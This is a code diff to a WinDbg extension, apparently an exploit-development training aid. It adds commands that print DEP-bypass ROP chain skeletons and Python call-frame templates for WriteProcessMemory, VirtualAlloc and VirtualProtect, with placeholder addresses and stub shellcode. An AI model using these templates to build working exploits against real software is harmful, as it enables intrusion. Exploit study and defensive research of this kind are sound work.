+    print(`  Skip three dwords:     dx @$osed().add_esp("${mod}")  add esp, 0xC ; ret, or pop ; pop ; pop ; ret`);
+    print(`  Code cave:             dx @$osed().code_caves("${mod}", 0x200, 25, "<bad chars>", "EXEC")`);
+    print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
+    section("Step 2 \u2014 PUSHAD register map");
+    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
+    print("    [ESP+0]  = EDI        <- add esp, 0xC ; ret (skips the next three dwords)");
+    print("    [ESP+4]  = ESI        <- skipped");
+    print("    [ESP+8]  = EBP        <- skipped");
+    print("    [ESP+12] = saved ESP  <- skipped");
+    print("    [ESP+16] = EBX        <- WriteProcessMemory address (read from the IAT slot)");
+    print("    [ESP+20] = EDX        <- return address = CAVE");
+    print("    [ESP+24] = ECX        <- hProcess = 0xFFFFFFFF");
+    print("    [ESP+28] = EAX        <- lpBaseAddress = CAVE");
+    print("    [ESP+32]  payload     <- lpBuffer = shellcode address, patched by one write");
+    print("    [ESP+36]  payload     <- nSize, patched if it holds bad bytes");
+    print("    [ESP+40]  payload     <- lpNumberOfBytesWritten = WRITABLE");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
+    print("");
+    print("OFFSET   = ???");
+    print('WPM_IAT  = 0x????????     # dx @$osed().sc.iat_find("WriteProcessMemory")');
+    print("CAVE     = 0x????????     # executable code cave");
+    print("WRITABLE = 0x????????     # writable dword");
+    print("");
+    print('rop = b""');
+    print("# first patch the lpBuffer dword after the pushad gadget (push esp ; pop eax, add, mov [reg], eax)");
+    print("# EBX = WriteProcessMemory");
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(WPM_IAT)");
+    print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
+    print("rop += p32(0x????????)    # xchg eax, ebx ; ret");
+    print("rop += p32(0x????????)    # pop edx ; ret");
+    print("rop += p32(CAVE)");
+    print("rop += p32(0x????????)    # pop ecx ; ret");
+    print("rop += p32(0xFFFFFFFF)");
+    print("rop += p32(0x????????)    # pop edi ; ret");
+    print(`rop += p32(0x????????)    # add esp, 0xC ; ret  dx @$osed().add_esp("${mod}")`);
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(CAVE)");
+    print(`rop += p32(0x????????)    # pushad ; ret  dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("rop += p32(0x46464646)    # lpBuffer                <- shellcode address");
+    print("rop += p32(0x47474747)    # nSize                   <- 0x210");
+    print("rop += p32(WRITABLE)      # lpNumberOfBytesWritten");
+    print("");
+    print('shellcode = b"\\x90" * 16 + b"..."');
+    print('payload = b"A" * OFFSET + rop + shellcode');
+    section("Step 4 \u2014 check");
+    print("  bp <pushad ; ret> ; g ; p ; dds esp L0b                       the map above, in this order");
+    print("  bp KERNELBASE!WriteProcessMemory ; g ; dds esp L6             CAVE, FFFFFFFF, CAVE, stack address, 0x210, WRITABLE");
+    print("  pt ; u <CAVE>                                                 the shellcode, copied into the cave");
   }
   function llaTemplate(mod) {
     section("LoadLibraryA \u2014 ROP Chain Skeleton");
@@ -13585,44 +13842,47 @@ var osed_bundle = (() => {
     print("  For chained LoadLibraryA -> GetProcAddress resolution, a flat stdcall frame");
     print("  or IAT slot_call dispatch is usually simpler than PUSHAD.");
   }
+  var TEMPLATES = {
+    VirtualAlloc: { skeleton: vaSkeletonTemplate, pushad: vaPushadTemplate },
+    VirtualProtect: { skeleton: vpSkeletonTemplate, pushad: vpPushadTemplate },
+    WriteProcessMemory: { skeleton: wpmSkeletonTemplate, pushad: wpmPushadTemplate },
+    LoadLibraryA: { skeleton: llaTemplate, pushad: llaTemplate },
+    GetProcAddress: { skeleton: gpaTemplate, pushad: gpaTemplate }
+  };
   function createRopTemplateCommand() {
     return {
       name: "rop_template",
-      description: "Print a commented ROP chain skeleton for a supported API.",
-      usage: "dx @$osed().rop_template(api?, module?)",
+      description: "Print a commented ROP chain skeleton for a supported API, in the skeleton or the PUSHAD style.",
+      usage: "dx @$osed().rop_template(api?, module?, style?)",
       examples: [
+        'dx @$osed().rop_template("VirtualAlloc", "essfunc")',
+        'dx @$osed().rop_template("VirtualAlloc", "essfunc", "pushad")',
         'dx @$osed().rop_template("VirtualProtect", "essfunc")',
-        'dx @$osed().rop_template("WriteProcessMemory", "essfunc")',
+        'dx @$osed().rop_template("WriteProcessMemory", "essfunc", "pushad")',
         'dx @$osed().rop_template("LoadLibraryA", "essfunc")',
         'dx @$osed().rop_template("GetProcAddress", "essfunc")'
       ],
       schema: {
-        api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory", "LoadLibraryA", "GetProcAddress"], default: "VirtualProtect" },
-        module: { type: "string", default: "TARGET_MODULE" }
+        api: { type: "string", enum: Object.keys(TEMPLATES), default: "VirtualProtect" },
+        module: { type: "string", default: "TARGET_MODULE" },
+        style: { type: "string", enum: ["skeleton", "pushad"], default: "skeleton" }
       },
       execute(options) {
-        var _a2, _b;
+        var _a2, _b, _c, _d;
         const api = (_a2 = options.api) != null ? _a2 : "VirtualProtect";
         const mod = (_b = options.module) != null ? _b : "TARGET_MODULE";
-        switch (api) {
-          case "WriteProcessMemory":
-            wpmTemplate(mod);
-            break;
-          case "LoadLibraryA":
-            llaTemplate(mod);
-            break;
-          case "GetProcAddress":
-            gpaTemplate(mod);
-            break;
-          default:
-            vpTemplate(mod);
-            break;
+        const style = (_c = options.style) != null ? _c : "skeleton";
+        const template = (_d = TEMPLATES[api]) == null ? void 0 : _d[style];
+        if (!template) {
+          const errors = [`Unknown api "${api}" or style "${style}". APIs: ${Object.keys(TEMPLATES).join(", ")}. Styles: skeleton, pushad.`];
+          return { command: "rop_template", args: options, success: false, findings: [], warnings: [], errors };
         }
+        template(mod);
         return {
           command: "rop_template",
           args: options,
           success: true,
-          findings: [{ api, module: mod }],
+          findings: [{ api, module: mod, style }],
           warnings: [],
           errors: []
         };
@@ -13631,36 +13891,66 @@ var osed_bundle = (() => {
   }
 
   // src/commands/dep_function.ts
+  var FRAMES = {
+    VirtualAlloc: {
+      alias: "VA",
+      lines: [
+        'va  = pack("<L", vaAddr)                 # VirtualAlloc address',
+        'va += pack("<L", shellcodeReturnAddr)   # Shellcode return address',
+        'va += pack("<L", shellcodeAddr)         # lpAddress: shellcode destination',
+        'va += pack("<L", dwSize)                # dwSize',
+        'va += pack("<L", flAllocationType)      # flAllocationType',
+        'va += pack("<L", flProtect)             # flProtect'
+      ]
+    },
+    VirtualProtect: {
+      alias: "VP",
+      lines: [
+        'vp  = pack("<L", vpAddr)                 # VirtualProtect address',
+        'vp += pack("<L", shellcodeReturnAddr)   # Shellcode return address',
+        'vp += pack("<L", shellcodeAddr)         # lpAddress: start of the region to make executable',
+        'vp += pack("<L", dwSize)                # dwSize',
+        'vp += pack("<L", 0x40)                  # flNewProtect: PAGE_EXECUTE_READWRITE',
+        'vp += pack("<L", oldProtectAddr)        # lpflOldProtect: writable address, e.g. in .data'
+      ]
+    },
+    WriteProcessMemory: {
+      alias: "WPM",
+      lines: [
+        'wpm  = pack("<L", wpmAddr)              # WriteProcessMemory address',
+        'wpm += pack("<L", shellcodeReturnAddr) # Shellcode return address',
+        'wpm += pack("<L", 0xFFFFFFFF)          # pseudo process handle',
+        'wpm += pack("<L", codeCaveAddr)        # code cave address',
+        'wpm += pack("<L", stackBufferAddr)     # lpBuffer',
+        'wpm += pack("<L", shellcodeSize)       # nSize',
+        'wpm += pack("<L", bytesWrittenAddr)    # lpNumberOfBytesWritten'
+      ]
+    }
+  };
+  var NAMES = Object.keys(FRAMES);
+  function parseApi(input) {
+    const key2 = input.trim().toLowerCase();
+    return NAMES.find((name) => name.toLowerCase() === key2 || FRAMES[name].alias.toLowerCase() === key2);
+  }
   function createDepFunctionCommand() {
     return {
       name: "dep_function",
-      description: "Print a Python call-frame skeleton for VirtualAlloc or WriteProcessMemory.",
-      usage: 'dx @$osed().dep_function("VA" | "WPM")',
-      examples: ['dx @$osed().dep_function("VA")', 'dx @$osed().dep_function("WPM")'],
-      compactExampleCount: 2,
+      description: "Print a Python call-frame skeleton for VirtualAlloc, VirtualProtect or WriteProcessMemory. VA, VP and WPM work as short aliases.",
+      usage: 'dx @$osed().dep_function("VirtualAlloc" | "VirtualProtect" | "WriteProcessMemory")',
+      examples: [
+        'dx @$osed().dep_function("VirtualAlloc")',
+        'dx @$osed().dep_function("VirtualProtect")',
+        'dx @$osed().dep_function("WriteProcessMemory")'
+      ],
+      compactExampleCount: 3,
       schema: { method: { type: "string", required: true } },
       execute(options) {
-        const input = options.method.trim().toLowerCase();
-        const method = input === "va" || input === "virtualalloc" ? "VA" : input === "wpm" || input === "writeprocessmemory" ? "WPM" : void 0;
+        const method = parseApi(options.method);
         if (!method) {
-          return { command: "dep_function", args: options, success: false, findings: [], warnings: [], errors: ['Use "VA" or "WPM".'] };
+          const error2 = 'Use "VirtualAlloc", "VirtualProtect" or "WriteProcessMemory" (aliases "VA", "VP", "WPM").';
+          return { command: "dep_function", args: options, success: false, findings: [], warnings: [], errors: [error2] };
         }
-        const lines = method === "VA" ? [
-          'va  = pack("<L", vaAddr)                 # VirtualAlloc address',
-          'va += pack("<L", shellcodeReturnAddr)   # Shellcode return address',
-          'va += pack("<L", shellcodeAddr)         # lpAddress: shellcode destination',
-          'va += pack("<L", dwSize)                # dwSize',
-          'va += pack("<L", flAllocationType)      # flAllocationType',
-          'va += pack("<L", flProtect)             # flProtect'
-        ] : [
-          'wpm  = pack("<L", wpmAddr)              # WriteProcessMemory address',
-          'wpm += pack("<L", shellcodeReturnAddr) # Shellcode return address',
-          'wpm += pack("<L", 0xFFFFFFFF)          # pseudo process handle',
-          'wpm += pack("<L", codeCaveAddr)        # code cave address',
-          'wpm += pack("<L", stackBufferAddr)     # lpBuffer',
-          'wpm += pack("<L", shellcodeSize)       # nSize',
-          'wpm += pack("<L", bytesWrittenAddr)    # lpNumberOfBytesWritten'
-        ];
+        const { lines } = FRAMES[method];
         section(`${method} Python Call-Frame Skeleton`);
         for (const line of lines)
           print(line);
@@ -18263,25 +18553,26 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
     {
       name: "rop_template",
       summary: "Commented ROP chain skeleton for one API",
-      what: "Prints a commented chain skeleton for <api>, with ??? for each value you still need and the dx command that finds it.",
-      how: "Fills a fixed layout for the API's arguments and the PUSHAD register map. It reads nothing from the target; <module> only appears in the suggested commands.",
-      when: "Start of the DEP bypass, to see which values the chain needs before you search for them.",
+      what: "Prints a commented chain skeleton for <api> in the <style> style, with ??? for each value you still need and the dx command that finds it.",
+      how: "Fills a fixed layout for the API's arguments. The skeleton style puts a call frame of dummy dwords in the buffer, patches each field with a gadget and then pivots ESP onto the frame. The pushad style loads registers and lets one PUSHAD write the frame. It reads nothing from the target; <module> only appears in the suggested commands.",
+      when: "Start of the DEP bypass, to see which values the chain needs before you search for them. The skeleton style works with fewer gadgets; the pushad style is shorter when every register has a clean gadget.",
       args: [
-        { name: "api", meaning: "API to call.", optional: true, values: { VirtualProtect: "makes the stack executable.", WriteProcessMemory: "copies the shellcode into executable memory.", LoadLibraryA: "loads a DLL.", GetProcAddress: "looks up an export." } },
-        { name: "module", meaning: "Module named in the suggested commands.", optional: true }
+        { name: "api", meaning: "API to call.", optional: true, default: "VirtualProtect", values: { VirtualAlloc: "commits the stack page again as executable.", VirtualProtect: "makes the stack executable.", WriteProcessMemory: "copies the shellcode into executable memory.", LoadLibraryA: "loads a DLL, PUSHAD layout only.", GetProcAddress: "looks up an export, PUSHAD layout only." } },
+        { name: "module", meaning: "Module named in the suggested commands.", optional: true },
+        { name: "style", meaning: "How the chain builds the call frame.", optional: true, default: "skeleton", values: { skeleton: "dummy frame in the buffer, each field patched, then a pivot.", pushad: "register map written by PUSHAD." } }
       ],
-      example: 'dx @$osed().rop_template("VirtualProtect", "essfunc")',
-      output: "The register map, a Python layout with ??? placeholders, and the commands that find each value.",
-      report: "Laid out the <api> ROP chain with rop_template and filled each placeholder with addresses taken from <module>."
+      example: 'dx @$osed().rop_template("VirtualAlloc", "essfunc")',
+      output: "The value of each field and how to get it, the gadgets to search for, a Python layout with ??? placeholders, and the WinDbg commands that check each step.",
+      report: "Laid out the <api> ROP chain with rop_template in the <style> style and filled each placeholder with addresses taken from <module>."
     },
     {
       name: "dep_function",
-      summary: "VirtualAlloc or WriteProcessMemory frame skeleton",
-      what: "Prints a Python call-frame skeleton for VirtualAlloc or WriteProcessMemory, the two usual DEP bypass APIs.",
+      summary: "Call-frame skeleton for a DEP bypass API",
+      what: "Prints a Python call-frame skeleton for VirtualAlloc, VirtualProtect or WriteProcessMemory, the three usual DEP bypass APIs.",
       how: "Writes the stack frame in the order the API reads it: the API address, the return address, then each argument. It chooses no addresses; you fill them in for the target.",
       when: "DEP bypass, when you write the frame by hand before building it with gadgets.",
-      args: [{ name: "method", meaning: "Which API frame to print.", values: { VA: "VirtualAlloc.", WPM: "WriteProcessMemory." } }],
-      example: 'dx @$osed().dep_function("VA")',
+      args: [{ name: "method", meaning: "Which API frame to print. VA, VP and WPM work as aliases.", values: { VirtualAlloc: "VirtualAlloc (alias VA).", VirtualProtect: "VirtualProtect (alias VP).", WriteProcessMemory: "WriteProcessMemory (alias WPM).", VA: "VirtualAlloc.", VP: "VirtualProtect.", WPM: "WriteProcessMemory." } }],
+      example: 'dx @$osed().dep_function("VirtualAlloc")',
       output: "A commented Python skeleton with one line per stack word.",
       report: "Prepared the <method> call frame skeleton with dep_function and replaced each placeholder with target addresses.",
       quick: true
@@ -24902,7 +25193,7 @@ ${INDENT}`)]);
       case "nop":
         return { length: args[0], byte: args[1] };
       case "rop_template":
-        return { api: args[0], module: args[1] };
+        return { api: args[0], module: args[1], style: args[2] };
       case "dep_function":
         return { method: args[0] };
       case "sc_push_string":
